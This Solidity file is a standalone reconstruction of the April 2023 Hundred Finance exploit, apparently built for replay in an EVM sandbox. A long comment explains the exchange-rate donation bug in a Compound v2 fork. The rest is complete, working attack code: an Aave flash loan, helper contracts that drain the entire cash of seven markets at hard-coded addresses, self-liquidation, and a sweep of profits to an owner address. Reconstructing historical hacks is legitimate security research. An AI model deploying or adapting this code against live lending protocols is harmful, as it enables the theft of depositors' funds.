// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-HundredFinance_2).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry `contractTest`
// (testExploit() = the Aave V3 flash-loan kickoff; executeOperation() = the flash
// callback that loops over all 7 victim markets). For EACH market the real attack
// CREATE2-deploys a small single-purpose helper contract (`ETHDrain` for the ETH
// market, `tokenDrain` for every ERC20 market) whose CONSTRUCTOR does the whole
// mint -> redeem-to-dust -> donate -> borrow -> redeemUnderlying dance, forwards
// the borrowed funds + recovered donation back to the caller, and is finally
// liquidated BY the caller. The CREATE2 salt / deterministic-address machinery
// only exists to defeat front-running (so the attacker's mempool-visible tx
// can't be griefed into landing at a different helper address) — it has no
// effect on the exploit mechanism, so this synthetic version deploys each
// helper with a plain `new` instead (no salt, no address determinism), and
// runs the drain logic in a `run()` function called after deploy+fund rather
// than in the constructor (so the same helper CODE can be reused for every
// ERC20 market without re-deploying a differently-sized contract each time).
//
// A separate per-market helper contract IS load-bearing though (not merely
// cosmetic): CToken.liquidateBorrowFresh hard-reverts with
// LIQUIDATE_LIQUIDATOR_IS_BORROWER when `borrower == liquidator`, so the
// account holding the dust collateral share (the borrower) must be a
// DIFFERENT address than the account calling liquidateBorrow (the outer
// contract, acting as liquidator). Collapsing both roles into one contract
// makes every self-liquidation revert.
//
// Root cause: Hundred Finance's CToken (Compound v2 fork) prices its hToken
// share via `exchangeRate = (cash + borrows - reserves) / totalSupply`, where
// `cash` is the RAW ERC20 balanceOf(market) (CToken.sol's `getCashPrior()`).
// The hWBTC collateral market was left with a negligible `totalSupply`. The
// attacker mints a small hWBTC position, redeems all-but-2 shares (driving
// totalSupply to 2), then DONATES ~500 WBTC via a raw `transfer` (no shares
// minted) — the exchangeRate explodes from 0.5 to ~2.501e28 because the raw
// balance is now split across only 2 shares. With ONE dust share now valued at
// ~25,015 WBTC of collateral, the attacker borrows an entire victim market's
// cash, recovers the donation via `redeemUnderlying` (rounding lets 500 WBTC
// be redeemed while burning only 1 share), then self-liquidates the 1 leftover
// dust share (via the SEPARATE outer contract, per above). The donation is
// fully recovered every iteration, so the only real cost is the Aave
// flash-loan premium.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface ICErc20Delegate {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
    function getCash() external view returns (uint256);
    function underlying() external view returns (address);
}

interface ICEther {
    function borrow(uint256 borrowAmount) external returns (uint256);
    // NOTE: crETH.liquidateBorrow returns NOTHING (void) — unlike the ERC20
    // CErc20Delegate.liquidateBorrow, which returns uint256. Declaring a
    // uint256 return here would make Solidity revert on the empty return data.
    function liquidateBorrow(address borrower, address cTokenCollateral) external payable;
    function getCash() external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

interface IAaveFlashloan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IChainlinkPriceOracleProxy {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

ICErc20Delegate constant hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
IERC20 constant WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
IUnitroller constant unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);

// --- one drain cycle against the ETH market. Deployed fresh per market so the
// borrower/collateral position is a DIFFERENT address than the outer contract
// that ultimately liquidates it (see LIQUIDATE_LIQUIDATOR_IS_BORROWER above). -
contract ETHDrain {
    ICEther constant CEther = ICEther(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);

    // Called by HundredFinanceDrain AFTER it has funded this contract with
    // WBTC (deploy-then-fund, since we don't need CREATE2 address
    // determinism). Runs the full mint -> redeem-to-dust -> donate -> borrow
    // -> redeemUnderlying cycle and forwards all proceeds to `beneficiary`.
    function run(address beneficiary) external {
        // step 1-2: mint a small hWBTC position, redeem all-but-2 shares
        // (driving totalSupply to 2), then donate the entire WBTC balance
        // directly into hWBTC — no shares minted, so exchangeRate explodes.
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(4 * 1e8);
        hWBTC.redeem(hWBTC.totalSupply() - 2);

        uint256 donationAmount = WBTC.balanceOf(address(this));
        WBTC.transfer(address(hWBTC), donationAmount);

        // step 3: enter the (now dust-valued-as-huge) hWBTC market and borrow
        // the ENTIRE cash of the victim ETH market, forwarding it to the caller.
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(hWBTC);
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = CEther.getCash() - 1;
        CEther.borrow(borrowAmount);
        payable(beneficiary).transfer(address(this).balance);

        // step 4: redeem the donation back out. redeemTokens rounds DOWN, so
        // redeeming (donationAmount - 1) WBTC at the inflated rate burns only
        // 1 of the 2 outstanding shares, leaving exactly 1 dust share behind.
        uint256 redeemAmount = donationAmount - 1;
        hWBTC.redeemUnderlying(redeemAmount);

        // step 5: forward the recovered WBTC to the caller.
        WBTC.transfer(beneficiary, WBTC.balanceOf(address(this)));
    }

    receive() external payable {}
}

// --- one drain cycle against an ERC20 market (hToken). Same shape as
// ETHDrain but for a generic Compound-v2 ERC20 market. --------------------
contract TokenDrain {
    function run(ICErc20Delegate hToken, address beneficiary) external {
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(4 * 1e8);
        hWBTC.redeem(hWBTC.totalSupply() - 2);

        uint256 donationAmount = WBTC.balanceOf(address(this));
        WBTC.transfer(address(hWBTC), donationAmount);

        address[] memory cTokens = new address[](1);
        cTokens[0] = address(hWBTC);
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = hToken.getCash() - 1;
        hToken.borrow(borrowAmount);
        IERC20 underlyingToken = IERC20(hToken.underlying());
        underlyingToken.transfer(beneficiary, borrowAmount);

        // tokenDrain redeems the FULL donationAmount (no -1, unlike ETHDrain).
        hWBTC.redeemUnderlying(donationAmount);

        WBTC.transfer(beneficiary, WBTC.balanceOf(address(this)));
    }
}

contract HundredFinanceDrain {
    ICEther constant CEther = ICEther(0x1A61A72F5Cf5e857f15ee502210b81f8B3a66263);
    ICErc20Delegate constant hSNX = ICErc20Delegate(0x371cb7683bA0639A21f31E0B20F705e45bC18896);
    ICErc20Delegate constant hUSDC = ICErc20Delegate(0x10E08556D6FdD62A9CE5B3a5b07B0d8b0D093164);
    ICErc20Delegate constant hDAI = ICErc20Delegate(0x0145BE461a112c60c12c34d5Bc538d10670E99Ab);
    ICErc20Delegate constant hUSDT = ICErc20Delegate(0xb994B84bD13f7c8dD3af5BEe9dfAc68436DCF5BD);
    ICErc20Delegate constant hSUSD = ICErc20Delegate(0x76E47710AEe13581Ba5B19323325cA31c48d4cC3);
    ICErc20Delegate constant hFRAX = ICErc20Delegate(0xd97a2591930E2Da927b1903BAA6763618BD7425b);

    IERC20 constant USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 constant SNX = IERC20(0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4);
    IERC20 constant sUSD = IERC20(0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9);
    IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 constant DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    IAaveFlashloan constant aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IChainlinkPriceOracleProxy constant priceOracle =
        IChainlinkPriceOracleProxy(0x10010069DE6bD5408A6dEd075Cf6ae2498073c73);

    address public immutable owner_;

    constructor(address owner__) {
        owner_ = owner__;
    }

    // step 0: sweep any stray native balance, then flash-borrow 500 WBTC from
    // Aave V3. The flash-loan callback (executeOperation) does the whole drain.
    function run() external {
        payable(address(0)).transfer(address(this).balance);
        aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);
    }

    function executeOperation(
        address, /* asset */
        uint256, /* amount */
        uint256, /* premium */
        address, /* initiator */
        bytes calldata /* params */
    ) external payable returns (bool) {
        // The exploit contract starts pre-seeded with 1,503,167,295 hWBTC (see
        // setup.steps in the config, mirroring the "anti front-run" transfer
        // from the historical attacker EOA). Redeem it up front, exactly like
        // the real contractTest.executeOperation does, so the WBTC recovered
        // here plus the 500 WBTC flash loan fund every market's donation.
        hWBTC.redeem(hWBTC.balanceOf(address(this)));

        drainETH();
        drainToken(hSNX);
        drainToken(hUSDC);
        drainToken(hDAI);
        drainToken(hUSDT);
        drainToken(hSUSD);
        drainToken(hFRAX);

        WBTC.approve(address(aaveV3), type(uint256).max);

        // Sweep the drained ETH + ERC20 proceeds to the final profit receiver
        // now that every market has been liquidated and this contract needs
        // no more ETH for liquidateBorrow value transfers.
        if (address(this).balance > 0) {
            payable(owner_).transfer(address(this).balance);
        }
        _sweep(USDC);
        _sweep(SNX);
        _sweep(sUSD);
        _sweep(USDT);
        _sweep(DAI);
        return true;
    }

    function _sweep(IERC20 token) internal {
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) token.transfer(owner_, bal);
    }

    // Deploy an ETHDrain helper WITHOUT funding it first (mirrors the real
    // attack, which pre-computes the CREATE2 address and transfers WBTC to it
    // BEFORE deployment — here we just deploy first, since address order does
    // not matter without CREATE2, then transfer, so the constructor sees the
    // balance). Its constructor runs the whole donate/borrow/recover cycle.
    // Borrowed ETH + recovered WBTC are forwarded back to THIS contract (the
    // liquidator) — NOT directly to owner_ — because this contract must hold
    // native ETH to pay `liquidateBorrow{value: ...}` below. This contract
    // then self-liquidates the dust share ETHDrain (the borrower) is left
    // holding — two different addresses, satisfying Compound's
    // LIQUIDATE_LIQUIDATOR_IS_BORROWER guard. All profit is swept to owner_
    // once, after every market has been drained (see executeOperation).
    function drainETH() internal {
        uint256 wbtcBalance = WBTC.balanceOf(address(this));
        ETHDrain drainer = new ETHDrain();
        WBTC.transfer(address(drainer), wbtcBalance);
        drainer.run(address(this));

        uint256 liquidationRepayAmount = getLiquidationRepayAmount(address(CEther));
        CEther.liquidateBorrow{value: liquidationRepayAmount}(address(drainer), address(hWBTC));
        hWBTC.redeem(1); // withdraw the seized dust share
    }

    // Same shape as drainETH but for a generic Compound-v2 ERC20 market.
    function drainToken(ICErc20Delegate hToken) internal {
        uint256 wbtcBalance = WBTC.balanceOf(address(this));
        TokenDrain drainer = new TokenDrain();
        WBTC.transfer(address(drainer), wbtcBalance);
        drainer.run(hToken, address(this));

        // liquidateBorrow's repayBorrowFresh pulls `repayAmount` of the
        // underlying via transferFrom(liquidator, market, repayAmount) — this
        // contract (the liquidator) must approve the market first.
        IERC20 underlyingToken = IERC20(hToken.underlying());
        underlyingToken.approve(address(hToken), type(uint256).max);
        hToken.liquidateBorrow(address(drainer), getLiquidationRepayAmount(address(hToken)), address(hWBTC));
        hWBTC.redeem(1); // withdraw the seized dust share
    }

    // mirrors contractTest.getLiquidationRepayAmount: computes the exact
    // repay amount that seizes exactly 1 hWBTC share at the current
    // (inflated or post-recovery) exchange rate + liquidation incentive.
    function getLiquidationRepayAmount(address hToken) public view returns (uint256) {
        uint256 exchangeRate = hWBTC.exchangeRateStored();
        uint256 liquidationIncentiveMantissa = 1_080_000_000_000_000_000;
        uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(hToken);
        uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));
        uint256 hTokenAmount = 1;
        uint256 liquidateAmount = 1e18
            / (
                priceBorrowedMantissa * liquidationIncentiveMantissa
                    / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)
            ) + 1;
        return liquidateAmount;
    }

    receive() external payable {}
}
